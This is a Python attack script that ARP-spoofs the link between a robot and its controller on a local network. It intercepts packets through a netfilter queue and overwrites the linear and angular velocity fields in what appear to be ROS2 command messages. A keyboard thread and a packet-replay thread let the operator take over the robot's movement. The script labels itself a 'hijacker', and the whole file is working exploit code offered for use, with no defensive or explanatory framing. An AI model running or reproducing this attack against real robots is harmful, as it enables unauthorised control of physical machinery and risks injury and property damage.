from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import struct
import sys
import select
import tty
import termios

# --- SETTINGS ---
robot_ip      = "192.168.0.194"
controller_ip = "192.168.0.16"
interface     = "wlan0"
queue_number  = 1

target_linear  = 0.0
target_angular = 0.0
last_packet    = None 

# --- SSH KEYBOARD ENGINE ---
def get_key():
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if select.select([sys.stdin], [], [], 0.1)[0]:
            return sys.stdin.read(1)
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

def keyboard_control_thread():
    global target_linear, target_angular
    # CALIBRATION: S was forward, so we flip the signs here.
    # Boosted turn speed to 3.0 to ensure it moves.
    speed, turn = 0.5, 1.0
    
    print("[*] CALIBRATED HIJACKER ACTIVE")
    print("[*] W: Back | S: Forward | A: Left | D: Right | SPACE: Stop")
    
    while True:
        k = get_key()
        if k == 's': # Forward
            target_linear = -speed; target_angular = 0.0
            print(f"\r[*] CMD: FORWARD | Lin: {target_linear}  Ang: {target_angular}   ", end="")
        elif k == 'w': # Backward
            target_linear = speed; target_angular = 0.0
            print(f"\r[*] CMD: REVERSE | Lin: {target_linear}  Ang: {target_angular}   ", end="")
        elif k == 'a': # Left Turn
            target_linear = 0.0; target_angular = turn
            print(f"\r[*] CMD: LEFT    | Lin: {target_linear}  Ang: {target_angular}   ", end="")
        elif k == 'd': # Right Turn
            target_linear = 0.0; target_angular = -turn
            print(f"\r[*] CMD: RIGHT   | Lin: {target_linear}  Ang: {target_angular}   ", end="")
        elif k == ' ':
            target_linear = 0.0; target_angular = 0.0
            print("\n[!] EMERGENCY STOP")
        time.sleep(0.02)

def inject_data(scapy_pkt):
    global target_linear, target_angular
    if not scapy_pkt.haslayer(Raw): return None
    
    # KEEP it as standard immutable bytes, do not use bytearray
    raw_data = bytes(scapy_pkt[Raw].load) 
    
    marker_pos = raw_data.find(b'\x15\x05')
    if marker_pos != -1:
        # Find CDR Header
        data_start = raw_data.find(b'\x01\x00\x00\x00', marker_pos)
        if data_start == -1:
            data_start = raw_data.find(b'\x00\x00\x01\x00', marker_pos)
        
        if data_start != -1:
            lin_x_off = data_start + 4
            ang_z_off = lin_x_off + 40
            
            if len(raw_data) >= ang_z_off + 8:
                # Use standard string concatenation to guarantee exact byte alignment
                new_payload = (
                    raw_data[:lin_x_off] + 
                    struct.pack('<d', float(target_linear)) + 
                    raw_data[lin_x_off+8:ang_z_off] + 
                    struct.pack('<d', float(target_angular)) + 
                    raw_data[ang_z_off+8:]
                )
                
                scapy_pkt[Raw].load = new_payload
                if IP in scapy_pkt:
                    del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
                if UDP in scapy_pkt:
                    del scapy_pkt[UDP].len; del scapy_pkt[UDP].chksum
                return scapy_pkt
    return None
def ghost_feeder_thread():
    global last_packet, target_linear, target_angular
    while True:
        if last_packet:
            pkt = last_packet.copy()
            modified = inject_data(pkt)
            if modified:
                send(modified, verbose=False)
        time.sleep(0.05)

def process_packet(packet):
    global last_packet
    try:
        scapy_pkt = IP(packet.get_payload())
        if scapy_pkt.haslayer(Raw):
            last_packet = scapy_pkt
            modified = inject_data(scapy_pkt)
            if modified:
                packet.set_payload(bytes(modified))
    except: pass
    packet.accept()

def arp_flood(r_mac, c_mac):
    while True:
        sendp(Ether(dst=r_mac)/ARP(op=2, pdst=robot_ip, hwdst=r_mac, psrc=controller_ip), verbose=False)
        sendp(Ether(dst=c_mac)/ARP(op=2, pdst=controller_ip, hwdst=c_mac, psrc=robot_ip), verbose=False)
        time.sleep(0.02) # Higher frequency flood

def get_mac(ip):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL)
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if fields[0] == ip: return fields[3]
    except: return None

if __name__ == "__main__":
    r_mac, c_mac = get_mac(robot_ip), get_mac(controller_ip)
    if r_mac and c_mac:
        threading.Thread(target=arp_flood, args=(r_mac, c_mac), daemon=True).start()
        threading.Thread(target=keyboard_control_thread, daemon=True).start()
        threading.Thread(target=ghost_feeder_thread, daemon=True).start()
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_number, process_packet)
        print("[*] SYSTEM READY. PRIME WITH CONTROLLER.")
        try: nfqueue.run()
        except KeyboardInterrupt: nfqueue.unbind()
